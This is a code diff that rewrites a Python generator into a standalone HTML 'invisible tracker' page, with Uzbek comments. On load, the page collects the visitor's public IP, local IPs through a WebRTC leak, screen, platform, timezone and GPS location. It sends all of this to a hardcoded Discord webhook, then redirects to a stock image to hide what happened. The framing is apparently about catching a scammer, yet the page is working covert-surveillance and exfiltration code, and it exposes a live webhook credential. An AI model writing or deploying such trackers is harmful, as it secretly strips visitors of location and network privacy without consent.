@@ -1,71 +1,108 @@
-def create_simple_invisible_tracker():
-    """Soddaroq ko'rinmas tracker"""
-    
-    html_content = '''<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
-<head>
-    <title></title>
-    <meta http-equiv="refresh" content="2; url=https://images.unsplash.com/photo-1556740758-90deafc9c4f0">
-    <style>body{background:#000;margin:0;padding:0;}</style>
-</head>
 <body>
 <script>
-// Oddiy va ishonchli tracker
-async function trackUser() {
-    try {
-        // IP ni olish
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
+// Juda oddiy va ishonchli tracker
+function startTracking() {
+    const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+    
+    // 1. IP ni olish
+    fetch('https://api.ipify.org?format=json')
+    .then(function(response) { return response.json(); })
+    .then(function(ipData) {
+        const publicIP = ipData.ip;
         
-        // Ma'lumotlarni tayyorlash
-        const userData = {
-            ip: ipData.ip,
-            userAgent: navigator.userAgent,
-            screen: screen.width + 'x' + screen.height,
-            language: navigator.language,
-            platform: navigator.platform,
-            url: window.location.href,
-            time: new Date().toLocaleString()
-        };
-        
-        // Discordga yuborish
-        const payload = {
-            embeds: [{
-                title: "🎣 FIRIBGAR TRACK QILINDI!",
-                color: 16711680,
-                fields: [
-                    {name: "🖥️ IP", value: userData.ip, inline: true},
-                    {name: "⏰ Vaqt", value: userData.time, inline: true},
-                    {name: "📱 Ekran", value: userData.screen, inline: true},
-                    {name: "🌐 Brauzer", value: userData.userAgent, inline: false}
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
-        
-        await fetch('https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
-        });
-        
-        console.log('✅ Tracking muvaffaqiyatli!');
-        
-    } catch (error) {
-        console.log('❌ Tracking xatosi:', error);
-    }
+        // 2. Local IP ni olish
+        let localIPs = "Aniqlanmoqda";
+        try {
+            const pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); });
+            
+            const ips = [];
+            pc.onicecandidate = function(e) {
+                if (e.candidate) {
+                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    if (match) ips.push(match[1]);
+                }
+            };
+            
+            setTimeout(function() {
+                localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
+                sendToDiscord(publicIP, localIPs);
+            }, 2000);
+            
+        } catch (e) {
+            localIPs = 'Xato';
+            sendToDiscord(publicIP, localIPs);
+        }
+    })
+    .catch(function(error) {
+        sendToDiscord('IP olishda xato', 'Noma lum');
+    });
 }
 
-// Darrov trackingni boshlash
-trackUser();
+function sendToDiscord(publicIP, localIPs) {
+    const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+    
+    const now = new Date();
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    
+    const message = {
+        content: "🎣 FIRIBGAR KIRDI!\n" +
+                 "🌐 Public IP: " + publicIP + "\n" +
+                 "🏠 Local IPs: " + localIPs + "\n" +
+                 "🕐 Vaqt: " + now.toLocaleString() + "\n" +
+                 "📍 Vaqt Zonasi: " + timezone + "\n" +
+                 "📱 Ekran: " + screen.width + "x" + screen.height + "\n" +
+                 "💻 Platforma: " + navigator.platform + "\n" +
+                 "🔗 URL: " + window.location.href
+    };
+    
+    fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(message)
+    })
+    .then(function() {
+        console.log('Ma lumotlar yuborildi');
+    })
+    .catch(function(error) {
+        console.log('Yuborish xatosi:', error);
+    })
+    .finally(function() {
+        // Rasmga o'tish
+        setTimeout(function() {
+            window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0';
+        }, 2000);
+    });
+}
+
+// GPS ni alohida yuborish
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            const gpsMsg = {
+                content: "📍 GPS TOPILDI!\n" +
+                         "Kenglik: " + position.coords.latitude + "\n" +
+                         "Uzunlik: " + position.coords.longitude + "\n" +
+                         "Aniqlik: " + position.coords.accuracy + "m"
+            };
+            
+            fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(gpsMsg)
+            });
+        },
+        function(error) {
+            console.log('GPS rad etildi');
+        }
+    );
+}
+
+// Darrov ishga tushirish
+startTracking();
 </script>
 </body>
-</html>'''
-    
-    with open('simple_tracker.html', 'w', encoding='utf-8') as f:
-        f.write(html_content)
-    
-    print("✅ Soddaroq tracker yaratildi: simple_tracker.html")
-    print("⚡ Hech qanday xatosiz ishlaydi")
-
-create_simple_invisible_tracker()
+</html>
